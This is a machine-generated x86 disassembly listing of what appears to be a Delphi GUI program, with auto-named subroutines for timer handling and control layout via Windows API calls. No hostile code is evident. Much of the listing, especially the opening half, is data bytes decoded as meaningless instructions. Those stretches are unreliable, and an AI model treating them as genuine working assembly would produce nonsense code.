add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09001f ] al
outsb
dec ebp
outsd
jne r-xdata
push 0xd0004489
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov eax [ eax + eax + 0x18 ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001c ] al
outsb
push eax
je r-xdata
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0018 ] al
outsb
inc ebx
outsd
outsb
imul ebp [ esi + 0x74 ] r-xdata
inc esp
push 0x6948776f
outsb
je r-xdata
outsb
jae r-xdata
adc [ edx ] 0x0
or eax [ ebx + 0x6f ]
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc [ edx ]
inc esp
add [ eax ] al
push ebp
jo r-xdata
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0021 ] al
outsb
push ebx
je r-xdata
inc esp
outsd
ja r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ edi + 0x6e ] ecx
jo r-xdata
add [ eax + 0x4f09001b ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x4 ] bp
inc esp
add [ eax ] cl
outsd
jo r-xdata
or al 0x43
inc edx
add [ eax + 0x1 ] ch
add bh bh
js r-xdata
lea eax [ eax + eax ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0020 ] al
outsb
push ebx
je r-xdata
sbb [ esi ] cl
jb r-xdata
loopne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov eax [ eax + eax - 0x18 ]
add [ eax ] al
add [ eax + 0x50030014 ] al
outsb
in al 0xf8
inc edx
add [ eax + 0x1 ] dh
add bh bh
test [ ebx + eax * 2 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
jb r-xdata
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x100430c ] ah
add bh ch
jmp [ eax + 0xe ]
push cs
inc esp
jb r-xdata
jb r-xdata
inc esp
add al bl
add [ eax ] al
inc edx
add ah ah
add al dh
or al 0x43
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax ] bl
push cs
inc esp
outsd
or al 0x42
add [ eax ] ch
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
add [ eax + 0x69 ] dl
inc ecx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
lea eax [ bx + si ]
in al dx
std
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xfe
inc edx
add [ esi + edi * 8 ] ah
inc edx
add [ eax + eax ] al
add [ eax + 0x4f0b001d ] al
add [ eax ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
jbe r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
mov eax [ eax + eax + 0x8 ]
sub_42fa6f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
or [ edi ] ah
inc edx
add [ ecx + eax ] ch
[ esp + ecx + 0x43 ]
sub_42fe56
push cs
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add bh bh
cmp [ esi ] cl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
je r-xdata
add [ ecx + esi ] cl
jb r-xdata
add [ eax - 0x75 ] dh
inc ecx
add [ eax + 0x4004314 ] al

inc ebp
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0x12
inc ebx
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
popad
insb
nop
push ebp
inc ecx
add [ eax ] bh
add [ eax ] al
dec [ eax + 0xe ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42ff0072
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x1
inc edx
add al dh
inc [ edx ]
and al 0x2
add [ eax ] al
nop
push es
inc esp
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
sub_43081a
inc esp
add [ ebx + ebx * 8 + 0x44 ] bl
add [ eax ] cl
sbb al [ ebx ]
xchg esp eax
sbb eax [ ebx ]
sbb eax [ fs : ebx ]
add eax 0xd4ffd500
call ebx
call eax
inc edi
inc eax
sbb eax [ ebx ]
aam 0x1f
inc ebx
add [ eax + 0x43 ] bh
add ah cl
sbb [ ebx ] eax
sbb [ ecx ] ah
inc ebx
add [ ecx ] cl
push esp
push ebx
jo r-xdata
popad
jo r-xdata
imul esi [ esp + esi * 2 + 0x65 ] 0x5cc08b72
or [ ebx ] al
pop es
or [ ebx + edx * 2 + 0x70 ] edx
insb
imul esi [ esp + esi * 2 + 0x65 ] 0x43079472
add [ eax + 0x1700449c ] ah
add [ eax ] cl
inc ebp
js r-xdata
adc [ eax ] al
insd
add [ eax ] eax
dec [ eax ]
and [ ebx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65420700
jbe r-xdata
aam 0xd7
inc ebx
je r-xdata
popad
imul ebp [ esi + 0x74 ] 0x43068873
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
dec ebp
imul ebp [ esi + 0x53 ] 0x657a69
adc [ eax ] al
pop edx
add [ eax ] al
insb
add al 0x20
inc edx
add [ eax ] dh
add bh bh
outsd
push ebx
outsb
add [ eax + eax + 0x78 ] 0x0
add bh bh
inc eax
fadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dl 0xff
inc esp
add al dh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xeff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xlat
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ ecx + eax ] ch
[ ecx + eax ]
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

sub_430886
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ ecx + eax ] ch
[ ecx + eax ]
sub_430972
clc
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add al 0x0
add eax 0x74646957
push r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or ecx [ edi + 0x6e ]
inc ebx
outsb
je r-xdata
inc ebx
push eax
jpe r-xdata
add [ edi ] al
outsd
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x41
mov eax ebx
call sub_44ce14
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d9c
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_430c64
mov dl 0x1
mov eax [ r-xdata ]
call sub_424068
mov esi eax
mov [ ebx + 0x16c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_430c64
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ ebx + 0x50b5043 ] cl
add al 0xb
inc ebx
add [ ecx + 0x41ba5043 ] cl
add [ eax ] al
add [ ebx - 0x3cab173d ] cl
add [ eax ] eax
nop
push ebp
inc ecx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
insb
outsd
jb r-xdata
push es
inc ebx
add [ eax - 0x5700ffff ] ch
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
or edx [ edx + 0x65 ]
jae r-xdata
insb
retn
nop
push ebp
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070016 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x8b55c08b
in al dx
push ecx
push ebx
push esi
test dl dl
je r-xdata
push edx
jae r-xdata
jpe r-xdata
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x41
mov eax ebx
call sub_44cdf0
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_455064
mov eax [ ebx + 0x50 ]
add esp 0xfffffff0
call sub_4034c0
popad
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070015 ] al
outsb
dec ebp
outsd
jbe r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
push eax
int 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
insb
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
push esp
aad 0x44
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
sub_430b08
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403174
mov eax [ esi + 0x16c ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4550c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_430b44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x160 ]
mov edx [ ebx + 0x168 ]
mov eax esi
call sub_4249a0
mov edx [ ebx + 0x16c ]
mov eax esi
call sub_4249ac
mov eax [ esi + 0x10 ]
call sub_424034
sar eax 0x1
jns r-xdata
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x10 ]
call sub_424034
mov edi [ ebx + 0x48 ]
sub edi eax
inc edi
mov eax [ esi + 0x10 ]
call sub_424034
mov ebp [ ebx + 0x4c ]
sub ebp eax
inc ebp
mov eax [ esi + 0x10 ]
call sub_424034
test eax eax
jne r-xdata
adc eax 0x0
cmp ebp edi
jle r-xdata
dec edi
dec ebp
mov eax ebp
mov eax edi
jmp r-xdata
sub edi eax
sar edi 0x1
jns r-xdata
sub dl 0x2
je r-xdata
mov dl [ ebx + 0x170 ]
sub dl 0x1
je r-xdata
add [ esp ] edi
sub ebp eax
sar ebp 0x1
jns r-xdata
adc edi 0x0
sub dl 0x2
jne r-xdata
add [ esp + 0x4 ] ebp
mov edi eax
mov ebp eax
adc ebp 0x0
mov dl [ ebx + 0x170 ]
sub dl 0x2
jb r-xdata
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_424700
jmp r-xdata
sub dl 0x2
jb r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov edx eax
test edx edx
jns r-xdata
sub dl 0x2
jb r-xdata
sar edx 0x2
push edx
push edx
mov ecx [ esp + 0x14 ]
mov eax esi
mov edx [ esp + 0x10 ]
call sub_424748
jmp r-xdata
add edx 0x3
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_4245b4
jmp r-xdata
sub_430ca0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4209c8
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_430d28
call sub_421b14
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_430cf0
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_430d9c
mov eax [ esi + 0x34 ]
call sub_421bc8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420a14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_430d28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_430d62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430d9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_430e1b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430e22
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
sub_430fdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_446eac
mov edx edi
mov eax [ esi + 0x210 ]
call sub_41814c
xor edx edx
mov eax edi
call sub_44d554
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_44d7a8
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_43140c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_431060
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_418444
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fc6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_431098
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4310fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4471ac
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_431102
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431128
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_452e00
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403370
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_431168
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_452c48
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403370
pop edx
pop esi
pop ebx
retn
sub_431194
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_443b18
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_431444
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_431224
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4314b8
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403174
mov eax [ esi + 0x210 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_455b40
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_431274
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_423a58
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4313fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_453e1c
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_44d554
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_44d038
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4182a8
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403370
test al al
je r-xdata
sub_43140c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418304
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_44d240
mov eax ebx
mov si 0xffeb
call sub_403370
sub_431444
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_4315bc
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_4314b8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_430fdc
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_418390
call sub_403174
pop edi
pop esi
pop ebx
retn
sub_4314f8
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_431274
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431530
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_4182a8
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4182a8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_4315bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_431685
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_4314b8
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_431274
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43168c
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_4182a8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4182a8
pop edx
call sub_44d664
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_431694
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_453308
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_4182a8
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_431708
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455064
mov [ esi + 0x16c ] 0x1
mov dl 0x3
mov eax esi
call sub_44cb48
mov edx 0x3
mov eax esi
call sub_44cdf0
mov dx 0xfff2
mov eax esi
call sub_44d840
mov [ esi + 0x188 ] 0x1e
mov [ esi + 0x1a8 ] 0x3
mov [ esi + 0x1a0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
